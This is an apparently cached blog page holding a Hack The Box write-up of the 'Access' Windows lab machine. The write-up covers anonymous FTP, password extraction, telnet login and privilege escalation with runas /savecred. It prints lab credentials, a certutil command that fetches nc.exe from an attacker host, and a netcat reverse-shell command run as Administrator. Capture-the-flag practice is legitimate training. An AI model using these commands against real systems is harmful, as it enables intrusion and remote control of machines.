@@ -1,0 +1,151 @@
+I"�<h1 id="introductionaccess">Introduction@Access:~$</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Column</th>
+      <th>Details</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Name</td>
+      <td>Access</td>
+    </tr>
+    <tr>
+      <td>IP</td>
+      <td>10.10.10.98</td>
+    </tr>
+    <tr>
+      <td>Points</td>
+      <td>20</td>
+    </tr>
+    <tr>
+      <td>Os</td>
+      <td>Windows</td>
+    </tr>
+    <tr>
+      <td>Difficult</td>
+      <td>Easy</td>
+    </tr>
+    <tr>
+      <td>Creator</td>
+      <td><a href="https://www.hackthebox.eu/home/users/profile/1190">egre55</a></td>
+    </tr>
+    <tr>
+      <td>Out on</td>
+      <td>29th September 2018</td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="summary">Summary:~$</h1>
+
+<ul>
+  <li>Discovering the new host and scanning for open ports.</li>
+  <li><code class="language-plaintext highlighter-rouge">Anonymous</code> loging into the ftp port.</li>
+  <li>Downloading the files in both of the directories via <code class="language-plaintext highlighter-rouge">ftp</code>.</li>
+  <li>Extracting the password from <code class="language-plaintext highlighter-rouge">backup.mdb</code> to open <code class="language-plaintext highlighter-rouge">Access Control.zip</code> file.</li>
+  <li>Loging in with the <code class="language-plaintext highlighter-rouge">credentials</code> found for telnet and getting user flag.</li>
+  <li>Exploiting <code class="language-plaintext highlighter-rouge">runas</code> command to get the Root Privileges on the machine.</li>
+</ul>
+
+<h1 id="starting">Starting:~$</h1>
+
+<h2 id="nmap">Nmap</h2>
+
+<p>I have used <strong>nmapAutomator</strong> , which keeps the scanning fast and reduces effort.<em>(Not recommended in real life scenarios).</em></p>
+
+<p>Dowload link: <a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a></p>
+
+<hr />
+<p><img src="/assets/img/access-hackthebox/nmap-scan-1.png" alt="" /></p>
+
+<p>Basically <code class="language-plaintext highlighter-rouge">3</code> Ports are open i.e. <code class="language-plaintext highlighter-rouge">21,23,80</code>. Let’s access <code class="language-plaintext highlighter-rouge">Port 80</code> first.</p>
+
+<hr />
+<p><img src="/assets/img/access-hackthebox/port-80-page-5.png" alt="" /></p>
+
+<p>I moved around a bit and even tried dirbuster on it, but nothing found interesting.</p>
+
+<p>Now let’s try to log into the <code class="language-plaintext highlighter-rouge">ftp</code> port as <code class="language-plaintext highlighter-rouge">anonymous</code> user.</p>
+
+<p><strong>Username</strong>: <code class="language-plaintext highlighter-rouge">anonymous</code> and <strong>Password</strong>: <code class="language-plaintext highlighter-rouge">anonymous</code></p>
+
+<hr />
+<p><img src="/assets/img/access-hackthebox/loggedin-anonymous-ftp-2.png" alt="" /></p>
+
+<p>It shows two directories i.e. <code class="language-plaintext highlighter-rouge">Backups</code> and <code class="language-plaintext highlighter-rouge">Engineer</code>.</p>
+
+<p>Downloading <code class="language-plaintext highlighter-rouge">backup.mdb</code> from <strong>Backups</strong> directory.</p>
+
+<hr />
+<p><img src="/assets/img/access-hackthebox/downloaded-backup-from-Backups-3.png" alt="" /></p>
+
+<p>Downloading <code class="language-plaintext highlighter-rouge">Access Control.zip</code> from <strong>Engineer</strong> directory.</p>
+
+<hr />
+<p><img src="/assets/img/access-hackthebox/downloaded-access-control-from-engineer-4.png" alt="" /></p>
+
+<p>I tried opening <code class="language-plaintext highlighter-rouge">Access Control.zip</code> but it requires a password.</p>
+
+<hr />
+<p><img src="/assets/img/access-hackthebox/access-control-password-6" alt="" /></p>
+
+<p>I assumed that we might find the <code class="language-plaintext highlighter-rouge">password</code> for <em>Access Control.zip</em> in <code class="language-plaintext highlighter-rouge">backup.mdb</code>, I directly ran the <code class="language-plaintext highlighter-rouge">strings</code> command on <em>backup.mdb</em> and found this:</p>
+
+<hr />
+<p><img src="/assets/img/access-hackthebox/access-password-strings-backup-mdb-7.png" alt="" /></p>
+
+<p><strong>Password</strong>: <code class="language-plaintext highlighter-rouge">access4u@security</code>.</p>
+
+<p>After accessing <code class="language-plaintext highlighter-rouge">Access Control.zip</code> it showed me a <em>.pst</em> file, which I opened on an online mail viewer.</p>
+
+<hr />
+<p><img src="/assets/img/access-hackthebox/pst-file-email-password-8" alt="" /></p>
+
+<p>It gave us some credentials, accessing telnet with it.</p>
+
+<p><strong>Username</strong>: <code class="language-plaintext highlighter-rouge">security</code> and <strong>Password</strong>: <code class="language-plaintext highlighter-rouge">4Cc3ssC0ntr0ller</code>.</p>
+
+<p>Loggedin telnet successfully and got <code class="language-plaintext highlighter-rouge">User Flag</code>.</p>
+
+<hr />
+<p><img src="/assets/img/access-hackthebox/got-telnet-shell-9.png" alt="" /></p>
+
+<p>For <code class="language-plaintext highlighter-rouge">Privilege Escalation</code>, I found a file in <strong>C:\Users\Public\Desktop</strong> with a name called <em>ZKAccess3.5 Security System.lnk</em></p>
+
+<hr />
+<p><img src="/assets/img/access-hackthebox/users-public-desktop-file-10.png" alt="" /></p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">type</code> command to get the contents of the file.</p>
+
+<hr />
+<p><img src="/assets/img/access-hackthebox/run-as-command-in-file-11.png" alt="" /></p>
+
+<p>After seeing <code class="language-plaintext highlighter-rouge">runas</code> command with <strong>Administrator</strong> mentioned in it (<em>runas command is being excuted as administrator</em>), I checked the permissions for administrator first.</p>
+
+<hr />
+<p><img src="/assets/img/access-hackthebox/no-password-required-for-admin-12.png" alt="" /></p>
+
+<p>As we can see that <code class="language-plaintext highlighter-rouge">Password required</code> is set to <strong>No</strong>, Let’s try to escalate privileges using <code class="language-plaintext highlighter-rouge">runas</code> command. Before that transfering <code class="language-plaintext highlighter-rouge">nc.exe</code> to the machine using <code class="language-plaintext highlighter-rouge">certutil</code> command.</p>
+
+<p><strong>Command</strong>: <code class="language-plaintext highlighter-rouge">certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe</code></p>
+
+<p><em>Make sure you are hosting nc.exe using python server. <strong>Commamd</strong> : <code class="language-plaintext highlighter-rouge">sudo python3 -m http.server 80</code></em></p>
+
+<hr />
+<p><img src="/assets/img/access-hackthebox/downloaded-nc-on-windows-machine-13.png" alt="" /></p>
+
+<p>Now using <code class="language-plaintext highlighter-rouge">runas</code> command to escalate privileges,  <strong>runas</strong> allows us to run commands as another user and the option /savecred allows us to use the command without asking for password.</p>
+
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---runas">runas commands</a></p>
+
+<p><strong>Command</strong>: <code class="language-plaintext highlighter-rouge">runas /user:Administrator /savecred "nc.exe -e cmd.exe 10.10.X.X LPORT"</code></p>
+
+<hr />
+<p><img src="/assets/img/access-hackthebox/runas-command-got-root-shell-14.png" alt="" /></p>
+
+<p>Got <code class="language-plaintext highlighter-rouge">Root</code>.</p>
+
+:ET
